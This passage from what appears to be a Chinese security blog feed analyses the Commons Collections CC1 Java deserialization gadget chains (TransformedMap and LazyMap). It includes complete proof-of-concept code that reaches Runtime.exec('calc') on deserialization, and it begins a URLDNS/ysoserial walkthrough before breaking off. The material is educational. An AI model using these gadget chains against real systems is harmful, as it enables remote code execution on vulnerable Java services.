class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure><p>在理解<code>ConstantTransformer</code>的<code>transform(Object)</code>方法的实际原理时也挺绕，可以试着把上面的执行效果带入到该方法中，能更好的理解如何实现最后调用到<code>InvokerTransformer</code>方法并传入<code>Runtime</code>对象</p><p><img src="/posts/dd664be3/cc1-33.png" title="transform方法"></p><p>通过一次一次循环把对应<code>Object</code>输出到下次作为输入就能理解怎么实现的了</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">object = <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class).transform(<span class="number">123</span>); </span><br><span class="line"><span class="comment">//= Runtime.class transform中输入任何数字都返回Runtime对象，但还没实例化</span></span><br><span class="line"></span><br><span class="line">Object = <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;).transform(Runtime.class) </span><br><span class="line"><span class="comment">//=Runtime.class.getRuntime()  调用Runtime对象的getRuntime() 但该方法还没执行，只是获取了该方法</span></span><br><span class="line"></span><br><span class="line">Object = <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;).transform(Runtime.class.getRuntime()) </span><br><span class="line"><span class="comment">//=Runtime.class.getRuntime()  执行Runtime.getRuntime() 此时正式实例化了Runtime对象</span></span><br><span class="line"></span><br><span class="line">Object = <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(Runtime.class.getRuntime().invoke())</span><br><span class="line"><span class="comment">//=Runtime.class.getRuntime().exec(&quot;calc&quot;) 执行Runtime.exec()方法</span></span><br></pre></td></tr></table></figure><p>3、在实现了2步骤的一长段的利用链的相关调用，最后就是传递的b就是<code>Transformer transformerChain = new ChainedTransformer(transformers);</code>中的<code>transformerChain</code>数组</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取AnnotationInvocationHandler类对象</span></span><br><span class="line">Class cla=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="comment">//获取AnnotationInvocationHandler类构造方法，参数为一个类对象和一个Map对象</span></span><br><span class="line">Constructor cons=cla.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line"><span class="comment">//传入参数用a,b代替表示</span></span><br><span class="line">Object obj=cons.newInstance(Generated.class,transformerChain);</span><br></pre></td></tr></table></figure><p>4、最后就是序列化该<code>AnnotationInvocationHandler</code>对象，反序列化时触发漏洞，得到最终POC</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">tmap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        <span class="comment">//反射获取AnnotationInvocationHandler的对象传入tmap</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> declaredConstructor.newInstance(Generated.class, tmap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化写入文件</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;result.ser&quot;</span>));</span><br><span class="line">        out.writeObject(obj);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反序列化触发漏洞</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;result.ser&quot;</span>));</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="LazyMap链"><a href="#LazyMap链" class="headerlink" title="LazyMap链"></a>LazyMap链</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>接下来是LazyMap链，CC1的另一条链，也是ysoserial中利用CC1的链。在分析<code>InvokerTransformer</code>类时说到该类为最终的执行类，找到调用<code>InvokerTransformer.transform(Object)</code>方法的类，其中有上文分析的TransformedMap类，还有个就是LazyMap类</p><p><img src="/posts/dd664be3/cc1-36.png" title="调用transform方法的类"></p><p>该类通过构造方法传入对象并赋值给<code>factory</code></p><p><img src="/posts/dd664be3/cc1-38.png" title="构造方法"></p><p>调用了<code>transform()</code>方法的<code>get</code>方法</p><p><img src="/posts/dd664be3/cc1-37.png" title="get方法"></p><p><code>get</code>方法中会判断参数<code>key</code>是否为<code>HashMap</code>中<code>Map</code>的内容，如果不是<code>Map</code>中的内容，就创建一个<code>value</code>作为<code>key</code>的值放入<code>Map</code>中，给value赋值时调用了<code>transform()</code>方法。<br>该<code>get()</code>方法在<code>AnnotationInvocationHandler</code>类的<code>invoke</code>方法中可调用，通过构造方法传入<code>LazyMap</code>对象然后在<code>invoke</code>方法中调用到<code>LazyMap.get()</code>方法</p><p><img src="/posts/dd664be3/cc1-39.png" title="invoke方法"></p><p>invoke方法的调用并不在该类重写的<code>readObject</code>方法中，因此入口点就有点变化，<code>AnnotationInvocationHandler</code>类实现了<code>InvocationHandler</code>动态类，这里调用<code>invoke</code>方法就涉及到<strong>动态代理</strong></p><p><img src="/posts/dd664be3/cc1-40.png" title="InvocationHandler"></p><p>动态代理<code>InvocationHandler</code>：</p><blockquote><p>每一个动态代理类的调用处理程序都必须实现InvocationHandler接口，并且每个代理类的实例都关联到了实现该接口的动态代理类调用处理程序中，当我们通过动态代理对象调用一个方法时候，这个方法的调用就会被转发到实现InvocationHandler接口类的invoke方法来调用</p></blockquote><p>实现方法：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">[接口类] proxyMap=(接口类)Proxy.newProxyInstance(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler invh)</span><br></pre></td></tr></table></figure><p>例如使用Map对象进行动态代理：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,invocationHandler);</span><br></pre></td></tr></table></figure><p>其中涉及到<code>Proxy</code>代理类，并通过<code>newProxyInstance()</code>实现动态代理。<br><code>newProxyInstance</code>类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">newProxyInstance</span><span class="params">(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler invh)</span>;</span><br></pre></td></tr></table></figure><p>三个参数分别表示:目标对象所属类的加载器、目标对象实现的接口数组、调用接口时触发的对应方法</p><p>实现demo:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Proxydemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">class</span> <span class="title class_">demo</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>&#123;</span><br><span class="line">            <span class="keyword">private</span> Map map;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="title function_">demo</span><span class="params">(Map map)</span>&#123;</span><br><span class="line">                <span class="built_in">this</span>.map=map;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;调用了invoke方法&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span>(method.getName().equals(<span class="string">&quot;put&quot;</span>))&#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;调用了put方法&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        InvocationHandler in=<span class="keyword">new</span> <span class="title class_">demo</span>(<span class="keyword">new</span> <span class="title class_">HashMap</span>());</span><br><span class="line">        Map map=(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,in);</span><br><span class="line">        map.put(<span class="string">&quot;11&quot;</span>,<span class="string">&quot;11&quot;</span>);</span><br><span class="line">        map.put(<span class="string">&quot;22&quot;</span>,<span class="string">&quot;22&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/dd664be3/cc1-41.png" title="InvocationHandler"></p><p>可以看到map对象每执行一次方法，便会调用执行一次invoke方法，invoke方法也可以起拦截器的作用。</p><p>简单了解了动态代理的用法，接下来回到LazyMap类的调用<br><code>LazyMap</code>的<code>get</code>方法在<code>AnnotationInvocationHandler</code>类的<code>invoke</code>方法中可调用<br>因此入口点就在实现动态类调用到LazyMap的invoke方法。</p><h3 id="完整利用链-1"><a href="#完整利用链-1" class="headerlink" title="完整利用链"></a>完整利用链</h3><p>LazyMap CC1链</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">            AnnotationInvocationHandler.readObject()</span><br><span class="line">                Map(Proxy).entrySet()</span><br><span class="line">                    AnnotationInvocationHandler.invoke()</span><br><span class="line">                        LazyMap.get()</span><br><span class="line">                            ChainedTransformer.transform()</span><br><span class="line">                                ConstantTransformer.transform()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Class.getMethod()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Runtime.getRuntime()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Runtime.exec()</span><br></pre></td></tr></table></figure><h3 id="构造POC-1"><a href="#构造POC-1" class="headerlink" title="构造POC"></a>构造POC</h3><p>POC的前半段依旧采用TransformedMap利用链的代码</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br></pre></td></tr></table></figure><p>将传参入口变更至LazyMap类中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Map Lmap = LazyMap.decorate(map, transformerChain);</span><br></pre></td></tr></table></figure><p>同<code>TransformedMap</code>利用链一样通过反射调用<code>AnnotationInvocationHandler</code>类，然后调用InvocationHandler代理调用<code>AnnotationInvocationHandler</code>类的构造函数传入参数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//反射调用AnnotationInvocationHandler类</span><br><span class="line">        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(true);</span><br><span class="line">//创建代理InvocationHandler对象调用AnnotationInvocationHandler类</span><br><span class="line">        InvocationHandler invohandler=(InvocationHandler)declaredConstructor.newInstance(Generated.class,Lmap);</span><br></pre></td></tr></table></figure><p>然后创建<code>proxy</code>代理对象，参数分别为<code>Map加载器</code>、<code>Map类数组</code>、<code>InvocationHandler对象invohandler</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Map proxymap=(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]&#123;Map.class&#125;,invohandler);</span><br></pre></td></tr></table></figure><p>再通过代理调用代理对象，执行<code>AnnotationInvocationHandler.invoke</code>方法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">InvocationHandler invohandlerproxy=(InvocationHandler)declaredConstructor.newInstance(Generated.class,proxymap);</span><br></pre></td></tr></table></figure><p>最后就是对<code>InvocationHandler</code>对象进行序列化，再反序列化触发漏洞</p><p>得到最终POC：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">        Map Lmap= LazyMap.decorate(map,transformerChain);</span><br><span class="line">        <span class="comment">//反射调用AnnotationInvocationHandler类</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//创建代理InvocationHandler对象调用AnnotationInvocationHandler类</span></span><br><span class="line">        InvocationHandler invohandler=(InvocationHandler)declaredConstructor.newInstance(Generated.class,Lmap);</span><br><span class="line">        <span class="comment">//创建proxy代理对象，参数分别为Map加载器、Map类数组、InvocationHandler对象invohandler</span></span><br><span class="line">        Map proxymap=(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,invohandler);</span><br><span class="line">        <span class="comment">//通过代理调用代理对象，执行invoke方法</span></span><br><span class="line">        InvocationHandler invohandlerproxy=(InvocationHandler)declaredConstructor.newInstance(Generated.class,proxymap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化InvocationHandler对象</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;exp.ser&quot;</span>));</span><br><span class="line">        out.writeObject(invohandlerproxy);</span><br><span class="line">        <span class="comment">//反序列化触发漏洞</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;exp.ser&quot;</span>));</span><br><span class="line">        input.readObject();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/dd664be3/cc1-42.png" title="执行POC"></p><h1 id="0x05、总结"><a href="#0x05、总结" class="headerlink" title="0x05、总结"></a>0x05、总结</h1><p>整体来说就是找到能够执行恶意函数的方法，然后一步步查看调用链，最后找到反序列化入口，cc1链看下来就比URL链复杂很多，链路调用步骤多了很多，有些链的类还需要明白怎么实现的，LazyMap加了动态代理然后调用链更绕。<br>分析单从完整利用链来推导相对容易很多，但会错过很多细节以及实现原理，可能会导致当时看完明白了过后过了段时间再回想就没法理清完整的利用链，这次分析的过程花费了不少的时间，中间有很多原理细节琢磨了有点久，只是记了我认为需要细理解的地方，可能还有些小细节没些或者被跳过了没注意，后面再看到的话再补充进来吧。</p><h1 id="0x06、参考链接"><a href="#0x06、参考链接" class="headerlink" title="0x06、参考链接"></a>0x06、参考链接</h1><p><a href="https://paper.seebug.org/1242/#commonscollections-1">https://paper.seebug.org/1242/#commonscollections-1</a><br>P牛-Java漫谈</p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
          <category> java利用链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java利用链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java安全-URLDNS链学习与分析</title>
      <link href="/posts/643c7e53.html"/>
      <url>/posts/643c7e53.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>延伸java序列化和java反射的内容，针对一些gadget利用链的一些学习，理解一下利用链的分析过程。<br>本文学习URLDNS反序列化链，也是java反序列化利用链里面最简单的一条，也利用java反序列化和反射的相关知识，可把前两篇java基础学习的知识运用在利用链里面，记录下利用链相关知识点。</p><p>本文角度两个方面，一是从ysoserial工具利用URLDNS角度分析学习，另一个角度是从URLDNS利用链分析学习。</p><h1 id="0x01、URLDNS链简述"><a href="#0x01、URLDNS链简述" class="headerlink" title="0x01、URLDNS链简述"></a>0x01、URLDNS链简述</h1><p>URLDNS是JAVA复杂的反序列化链中最简单的一条，它不是一条真正意义上的“利⽤链”。因为它所能产生的结果<font color="red">不是命令执⾏</font>，⽽是<font color="red">⼀次DNS请求</font>。</p><p>URLDNS通常用于快速监测是否存在反序列化漏洞，尤其对<strong>无回显的漏洞检测</strong>，原因：</p><ul><li>只依赖原生类</li><li>不限制jdk版本</li></ul><p>也就是说URLDN可直接调用java内置库即可进行操作，无需依赖其他第三方组件，同时不限制jdk版本不通带来的语言代码差异。</p><p>URLDNS链主要问题产生于HashMap,<font color="red">HashMap重写了readObject()反序列化方法，并且参数可控导致序列化漏洞</font>。</p><blockquote><p>HashMap简单介绍:<br>HashMap 是一个散列表，它存储的内容是键值对(key-value)映射。<br>HashMap 实现了 Map 接口，根据键的 HashCode 值存储数据，具有很快的访问速度，最多允许一条记录的键为 null，不支持线程同步。<br>HashMap 是无序的，即不会记录插入的顺序。<br>HashMap 继承于AbstractMap，实现了 Map、Cloneable、java.io.Serializable 接口。</p></blockquote><h1 id="0x02、yso-URLDNS利用链分析"><a href="#0x02、yso-URLDNS利用链分析" class="headerlink" title="0x02、yso-URLDNS利用链分析"></a>0x02、yso-URLDNS利用链分析</h1><h2 id="ysoserial环境准备"><a href="#ysoserial环境准备" class="headerlink" title="ysoserial环境准备"></a>ysoserial环境准备</h2><p>运行环境：idea<br>java环境: jdk8<br>漏洞环境：ysoserial(<a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a>)</p><p>idea相关配置:<br>下载ysoserial漏洞环境后在idea打开项目，idea会自动同步pom.xml中的依赖，注意的点是，需要更改文件-项目结构-项目设置-项目中的sdk版本和sdk默认值，如下图即可，不然在编译上可能会报错。随后构建项目即可。</p><p><img src="/posts/643c7e53/url-1.png" title="项目结构"><br><img src="/posts/643c7e53/url-2.png" title="java环境"></p><p>通过pol.xml知道主程序位置</p><p><img src="/posts/643c7e53/url-4.png" title="主程序"></p><p>在运行或者debug调试GeneratePayload.java文件，出现下面红色提示表示运行正常，项目部署成功，便可进行urldns链测试。</p><p><img src="/posts/643c7e53/url-3.png" title="运行部署"></p><p>运行-编辑配置里输入测试参数</p><p><img src="/posts/643c7e53/url-7.png" title="运行部署"></p><p>相当于使用主程序直接执行命令</p><p><img src="/posts/643c7e53/url-5.png" title="URLDNS序列化数据"></p><h2 id="yso-URLDNS链分析"><a href="#yso-URLDNS链分析" class="headerlink" title="yso-URLDNS链分析"></a>yso-URLDNS链分析</h2><p>yso生成URLDNS利用的序列化数据，主要为<code>URLDNS</code>、<code>url</code>两个参数</p><p><img src="/posts/643c7e53/url-5.png" title="URLDNS序列化数据"></p><p>在主程序获取参数下断点</p><p><img src="/posts/643c7e53/url-6.png" title="断点"></p><p>进行debug调试，参数<code>args[0]</code>即URLDNS传递给<code>payloadType</code>变量，参数<code>args[1]</code>即url传递给<code>command</code>变量</p><p><img src="/posts/643c7e53/url-8.png" title="断点"></p><p>获取Class类对象，类为<code>GeneratePayload.class.getPackage().getName() + &quot;.payloads.&quot; + className</code>对应得就是<code>ysoserial.payloads.URLDNS</code>类</p><p><img src="/posts/643c7e53/url-10.png" title="获取类对象"></p><p>对应返回给<code>payloadClass</code>对象</p><p><img src="/posts/643c7e53/url-11.png" title="获取类对象"></p><p>接下来对<code>Class对象</code>进行实例化</p><p><img src="/posts/643c7e53/url-12.png" title="实例化"></p><p>跟进<code>getObject()</code>方法，传递command参数也就是传入的url参数</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">               <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">               <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">               <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"></span><br><span class="line">               <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">               <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">               ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">               Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">               <span class="keyword">return</span> ht;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/643c7e53/url-13.png" title="getObject方法"></p><p>getObject方法中建立了<code>URLStreamHandler</code>流对象和<code>HashMap</code>对象,其中handler对象为<code>URLStreamHandler</code>的子类<code>SilentURLStreamHandler</code><br><code>URLStreamHandler 